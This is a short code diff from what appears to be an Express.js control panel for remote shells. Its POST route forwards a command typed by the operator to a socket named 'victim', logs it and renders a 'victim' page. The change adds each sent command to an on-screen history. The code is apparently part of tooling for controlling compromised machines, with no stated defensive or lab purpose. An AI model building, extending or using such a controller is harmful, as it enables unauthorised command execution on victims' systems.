@@ -116,7 +116,8 @@ app.post('/:ip', function (req, res) {
     else{
         timesReloadedSuccesfully = 0;
         previousCommandLine = '';
-        victim.write(req.body.command + "\n");
+        commandLine += ' > ' + req.body.command + '\n';
+        victim.write(req.body.command + '\n');
         console.log("%s User sent command: %s", date.format(), req.body.command);
         waitForResponse(victim);
         res.render('victim.html', { victim, commandLine, end: false});
